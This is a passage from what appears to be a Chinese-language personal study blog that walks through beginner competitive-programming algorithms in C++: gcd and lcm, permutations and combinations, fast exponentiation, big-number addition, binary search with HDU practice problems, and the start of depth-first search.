!b?a:gcd(b,a%b); <span class="comment">//三目运算符</span></span><br><span class="line">} </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> m,n;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; m &gt;&gt; n;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; gcd(m,n) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="lcm"><a class="markdownIt-Anchor" href="#lcm"></a> lcm</h4><p>lcm其实没啥好说的，用三目来说，直接看代码：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">return</span> !b?a:gcd(b,a%b);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lcm</span><span class="params">(<span class="keyword">int</span> m,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">return</span> (m*n)/gcd(m,n);</span><br><span class="line">} </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> m,n;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; m &gt;&gt; n;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; lcm(m,n) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>是不是超级简单，那就去练习一下：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=2504" target="_blank" rel="noopener">杭电2504</a></p><h3 id="排列组合"><a class="markdownIt-Anchor" href="#排列组合"></a> 排列组合</h3><p>排列组合也遇到过，解决“有多少种”这类问题经常遇见，只不过，这类问题都很简单，一学就会；概念高中已经学</p><p>过了，这里就不多说了；</p><h4 id="排列a"><a class="markdownIt-Anchor" href="#排列a"></a> 排列A</h4><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">A</span><span class="params">(<span class="keyword">int</span> m, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i,t,ans=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(m&lt;n)</span><br><span class="line">{</span><br><span class="line">m=t;</span><br><span class="line">t=n;</span><br><span class="line">n=m;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">for</span>(i=m;i&gt;=m-n+<span class="number">1</span>;i--)</span><br><span class="line">{</span><br><span class="line">ans *= i;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> m,n;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; m &gt;&gt; n;</span><br><span class="line"><span class="keyword">if</span>(m&gt;n) <span class="built_in">cout</span> &lt;&lt; A(m,n) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">cout</span> &lt;&lt; A(n,m) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="组合c"><a class="markdownIt-Anchor" href="#组合c"></a> 组合C</h4><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">C</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=n;i&gt;=n-k+<span class="number">1</span>;i--)</span><br><span class="line">    {</span><br><span class="line">    ans*=i;</span><br><span class="line">}</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=k;i++)</span><br><span class="line">    {</span><br><span class="line">    ans/=i;</span><br><span class="line">}</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> m,n;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; m &gt;&gt; n;</span><br><span class="line"><span class="keyword">if</span>(m&gt;n) <span class="built_in">cout</span> &lt;&lt; C(m,n) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">cout</span> &lt;&lt; C(n,m) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="快速幂"><a class="markdownIt-Anchor" href="#快速幂"></a> 快速幂</h3><p>快速幂这个算法可以用来计算那些次方很多数据很大的问题，有些问题会出现TLE，引入快速幂，很好得解决了这</p><p>个问题，它的时间复杂度为 O(log₂N)，上代码：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">quick</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> x,<span class="keyword">long</span> <span class="keyword">long</span> y)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">1</span>,base = x;</span><br><span class="line"><span class="keyword">while</span>( y &gt; <span class="number">0</span> )</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>( y % <span class="number">2</span> )</span><br><span class="line">{</span><br><span class="line">ans *= base;</span><br><span class="line">}</span><br><span class="line">base *= base;</span><br><span class="line">y /= <span class="number">2</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> m,n;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; m &gt;&gt; n;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; quick(m,n) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这个可以计算到2的62次方左右，因为long long的范围有限；</p><h3 id="大数相加模拟"><a class="markdownIt-Anchor" href="#大数相加模拟"></a> 大数相加（模拟）</h3><p>这个挺有意思的题目，上大学之前刷题的时候就有人说，初学者做不出来“A+B”，当时我还笑了，“A+B”有什么难</p><p>的，一个输入一个输出不就完事，后来有人说，那你计算111…(100个1) + 222…(100个2)的值，我一想，不行</p><p>啊，int不够，long long不够，int64页不够，我就放弃了；再后来…咳，请看代码：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//大数相加</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> m=<span class="number">1</span>,n=<span class="number">1</span>,i,j,L1,L2,k;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">1002</span>],b[<span class="number">1002</span>];</span><br><span class="line"><span class="keyword">int</span> num1[<span class="number">1002</span>],num2[<span class="number">1002</span>];</span><br><span class="line"><span class="built_in">memset</span>(num1,<span class="number">0</span>,<span class="keyword">sizeof</span>(num1));    <span class="comment">//数组清零 </span></span><br><span class="line"><span class="built_in">memset</span>(num2,<span class="number">0</span>,<span class="keyword">sizeof</span>(num2));    <span class="comment">//数组清零</span></span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; a &gt;&gt; b;                  <span class="comment">//输入数组 </span></span><br><span class="line">L1 = <span class="built_in">strlen</span>(a);  <span class="comment">//计算数组a的长度 </span></span><br><span class="line">L2 = <span class="built_in">strlen</span>(b); <span class="comment">//计算数组b的长度 </span></span><br><span class="line"><span class="keyword">for</span>(i=L1<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">{</span><br><span class="line">num1[m] = a[i] - <span class="string">'0'</span>;   </span><br><span class="line">m++;   <span class="comment">//字符--&gt;数字 </span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">for</span>(i=L2<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">{</span><br><span class="line">num2[n] = b[i] - <span class="string">'0'</span>;    </span><br><span class="line">n++;  <span class="comment">//字符--&gt;数字 </span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;<span class="number">1002</span>;i++)</span><br><span class="line">{</span><br><span class="line">k = i;</span><br><span class="line">num1[i] += num2[i];<span class="comment">// num1数组当成一个新的数组，重新赋值 </span></span><br><span class="line"><span class="keyword">if</span>(num1[i]&gt;<span class="number">9</span>)</span><br><span class="line">{</span><br><span class="line">num1[i] = num1[i]%<span class="number">10</span>;<span class="comment">//判断是否超过10 超过进位 </span></span><br><span class="line">num1[++k] ++;<span class="comment">//下一位进 1 </span></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1001</span>;i&gt;<span class="number">0</span>;i--)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(num1[i]!=<span class="number">0</span>) <span class="comment">//判断什么时候不为 0 </span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span>(j=i;j&gt;<span class="number">0</span>;j--)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; num1[j];</span><br><span class="line">}</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>原来啊，把数字转换成字符串的形式，这样的话，就很容易了；</p><p>学会了吗，去练习一下吧：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=1002" target="_blank" rel="noopener">杭电1002</a></p><h3 id="二分法"><a class="markdownIt-Anchor" href="#二分法"></a> 二分法</h3><p>这个算法是过双创中心面试之后第一个讲解的算法，其实现在还是懵懵的；</p><p>二分查找法，其实是一种有序的查找方法，也称折半查找，如果是无序的则要先进行排序操作；</p><p>基本思想是：目标值通过与中间元素比较，可分为三种情况：</p><p>1、目标值与中间元素相等，查找结束；</p><p>2、目标值比中间元素大，则把后半部分的中间元素与目标值比较；</p><p>3、目标值比中间元素小，则把前半部分的中间元素与目标值比较；</p><p>这三步一直循环，直到找到答案为止；</p><p>适用情况：求最大值中的最小值、求最小值中的最大值；（听着很别扭，其实就是这样）</p><p>类似于数学里面的二分，思想差不多；</p><p>以一道题来举例：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=4004" target="_blank" rel="noopener">杭电4004</a></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">500200</span>];</span><br><span class="line"><span class="keyword">int</span> L,n,m;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> x)</span> <span class="comment">//二分函数</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> i,cnt=<span class="number">0</span>,t=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(a[i]-a[i<span class="number">-1</span>]&gt;x)</span><br><span class="line">        {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">        <span class="keyword">if</span>(a[i]-t&gt;x)</span><br><span class="line">        {</span><br><span class="line">            cnt++;</span><br><span class="line">            t=a[i<span class="number">-1</span>];</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(cnt+<span class="number">1</span>&lt;=m)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> mid,i;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;L&gt;&gt;n&gt;&gt;m)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        {</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">}</span><br><span class="line">        a[<span class="number">0</span>]=<span class="number">0</span>,a[++n]=L;</span><br><span class="line">        sort(a,a+n+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">int</span> l=<span class="number">0</span>,r=L,res;</span><br><span class="line">        <span class="keyword">while</span>(l&lt;=r) <span class="comment">//这里的小于等于千万不能忘记等于</span></span><br><span class="line">        {</span><br><span class="line">            mid=(l+r)/<span class="number">2</span>; <span class="comment">//分半</span></span><br><span class="line">            <span class="keyword">if</span>(check(mid)) <span class="comment">//取左</span></span><br><span class="line">            {</span><br><span class="line">                res=mid;</span><br><span class="line">                r=mid<span class="number">-1</span>;</span><br><span class="line">            }</span><br><span class="line"><span class="keyword">else</span> <span class="comment">//取右</span></span><br><span class="line">            {</span><br><span class="line">            l=mid+<span class="number">1</span>; </span><br><span class="line">}</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; res &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这题是不是太难了呀，不要紧，在给你一道简单的：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=2199" target="_blank" rel="noopener">杭电2199</a></p><p>这题算是很简单的二分了，要是不会的话，回来看代码：</p><p>注意啊，这段代码里面的cin和cout要改成C语言的scanf和printf，不知为什么cin和cout过不去，可能因为保留的</p><p>小数位数吧，就很离谱；</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">f</span><span class="params">(<span class="keyword">double</span> x)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">return</span> (<span class="number">8</span>*x*x*x*x+<span class="number">7</span>*x*x*x+<span class="number">2</span>*x*x+<span class="number">3</span>*x+<span class="number">6</span>);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> t;</span><br><span class="line"><span class="keyword">double</span> l,r,m,n,mid;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; t;</span><br><span class="line"><span class="keyword">while</span>(t--)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; m;</span><br><span class="line">l=<span class="number">0</span>,r=<span class="number">100</span>;</span><br><span class="line"><span class="keyword">if</span>(f(<span class="number">0</span>)&gt;m||f(<span class="number">100</span>)&lt;m)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"No solution!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">while</span>(r-l &gt; <span class="number">0.000001</span>)</span><br><span class="line">{</span><br><span class="line">   mid = (l+r)/<span class="number">2</span>;</span><br><span class="line">   <span class="keyword">if</span>((f(mid)-m) &gt; <span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line">   r = mid;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">{</span><br><span class="line">l = mid;</span><br><span class="line">} </span><br><span class="line">}</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; setprecision(<span class="number">5</span>) &lt;&lt; r &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="dfs-bfs"><a class="markdownIt-Anchor" href="#dfs-bfs"></a> Dfs &amp; Bfs</h3><p>相信打过acm比赛的人都知道这两种算法，一种叫做dfs（深度优先搜索），一种叫做bfs（广度优先搜索）；</p><p>怎么说呢，折两种算法早就想学了，就是没找到机会，现在正好学习算法，就简单学学吧；</p><h4 id="dfs"><a class="markdownIt-Anchor" href="#dfs"></a> Dfs</h4><p>深度优先搜索算法（Depth First Search，简称DFS）：一种用于遍历或搜索树或图的算法。 沿着树的深度遍历树</p><p>的节点，尽可能深的搜索树的分支，当节点v的所在边都己被探寻过或者在搜寻时结点不满足条件，搜索将回溯到</p><p>发现节点v的那条边的起始节点，整个进程反复进行直到所有节点都被访问为止；</p><h5 id="模板"><a class="markdownIt-Anchor" href="#模板"></a> 模板</h5><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">(参数)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span>(满足条件)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> <span class="built_in">step</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">        判断边界</span><br><span class="line">        {</span><br><span class="line">            ...操作</span><br><span class="line">        }</span><br><span class="line">        尝试每一种可能</span><br><span class="line">        {</span><br><span class="line">               满足check条件</span><br><span class="line">               标记</span><br><span class="line">               继续下一步dfs(<span class="built_in">step</span>+<span class="number">1</span>)</span><br><span class="line">               恢复初始状态（回溯的时候要用到）</span><br><span class="line">        }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>模板也是根据实际情况来改，下面通过一个实例来了解一下：</p><h5 id="全排列问题"><a class="markdownIt-Anchor" href="#全排列问题"></a> 全排列问题</h5><p>问题描述：1~n , n个数字，能组成多少个不同的数字？</p><p>例如：n=3，则能组成的数字有：123 , 132 , 213 , 231 , 312 , 321</p><h5 id="代码-5"><a class="markdownIt-Anchor" href="#代码-5"></a> 代码</h5><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">10</span>], book[<span class="number">10</span>], n,num=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> <span class="built_in">step</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">step</span> == n + <span class="number">1</span>) <span class="comment">//判断边界</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; a[i];num++;</span><br><span class="line">}</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">for</span> (i = 